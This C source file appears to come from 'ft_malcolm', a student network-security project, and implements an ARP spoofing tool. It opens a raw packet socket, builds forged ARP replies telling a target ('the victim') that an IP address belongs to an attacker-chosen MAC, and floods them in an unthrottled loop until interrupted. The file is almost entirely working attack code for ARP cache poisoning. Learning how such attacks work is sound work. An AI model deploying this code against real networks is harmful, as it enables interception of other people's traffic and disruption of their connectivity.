#include "ft_malcolm.h"

volatile sig_atomic_t g_running = 1;

void    handle_sigint(int sig)
{
    (void)sig;
    g_running = 0;
}

static  int     create_raw_socket(void)
{
    // AF_PACKET gives access to the Ethernet layer.
    int fd = socket(AF_PACKET, SOCK_RAW, htons(0x0806));
    if (fd < 0) 
    {
        perror("ft_malcolm: socket");
        return -1;
    }
    // NOTE: hard coded timeout for now.
    struct timeval tv;
    tv.tv_sec = 5000 / 1000;
    tv.tv_usec = (5000 % 1000) * 1000;
    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
        perror("ft_malcolm: setsocketopt(SO_RCVTIMEO)");
    return fd;
}

/*
 * Ethernet header occupies exactly 14 bytes
 * DESTINATION MAC (6 Bytes)
 * SOURCE MAC (6 Bytes)
 * EtherType (2 bytes)
 * Payload
 * */
static int create_arp_message(t_data *data, packet *pkt)
{
    memset(pkt, 0, sizeof(packet));

    /* Ethernet header */
    memcpy(pkt->eth.h_source, data->source_mac, ETH_ALEN);
    memcpy(pkt->eth.h_dest, data->target_mac, ETH_ALEN);
    pkt->eth.h_proto = htons(ETH_P_ARP);

    /* ARP header */
    pkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    pkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    pkt->arp.ea_hdr.ar_hln = ETH_ALEN;
    pkt->arp.ea_hdr.ar_pln= 4;
    // NOTE: We must send an unsolicited (gratuitous ARP) REPLY ot the victim.
    pkt->arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

    /* ARP addresses */
    /* sha = source_mac, spa = source_ip (we claim to be source ip)
     * tha = target_mac, tpa = target_ip (we tell target this mapping)
     */
    memcpy(pkt->arp.arp_sha, data->source_mac, ETH_ALEN);
    memcpy(pkt->arp.arp_spa, &data->source_ip, 4);
    memcpy(pkt->arp.arp_tha, data->target_mac, ETH_ALEN);
    memcpy(pkt->arp.arp_tpa, &data->target_ip, 4);

    return 0;
}

// Get's the default interface
int get_interface(char *iface, size_t len)
{
    struct if_nameindex *ifs = if_nameindex();
    if (!ifs)
        return (-1);
    for (struct if_nameindex *it = ifs; it->if_name; it++)
    {
        // Skip loopback
        if (strncmp(it->if_name, "lo", 2) == 0)
            continue;
        if (strlen(it->if_name) < len)
        {
            strncpy(iface, it->if_name, len-1);
            iface[len -1] = '\0';
            if_freenameindex(ifs);
            return (0);
        }
    }
    if_freenameindex(ifs);
    return (-1);
}

int     ft_malcolm(t_data *data)
{
    // Step 1: open correct socket and bind it to default iface
    int fd = create_raw_socket();
    if (fd < 0) return -1;
    if (data->iface[0] == '\0' && get_interface(data->iface, sizeof(data->iface)) < 0)
    {
        fprintf(stderr, "no default interface found\n");
        close(fd);
        return (-1);

    }
    
    struct  sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(data->iface);
    sll.sll_protocol = htons(ETH_P_ARP);
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
    {
        perror("bind");
        close(fd);
        return (-1);
    }
    // Step 2: Create the Ethernet Frame Header and arp message inside it.
    packet pkt;
    if (create_arp_message(data, &pkt) < 0)
    {
        close(fd);
        return (-1);
    }
    // Step 3: Send gratuitous ARP replies
    while (g_running)
    {
        ssize_t n = sendto(fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sll, sizeof(sll));
        if (n < 0) {
            perror("sendto");
            break;
        }
    }
    close(fd);
    return (0);
}
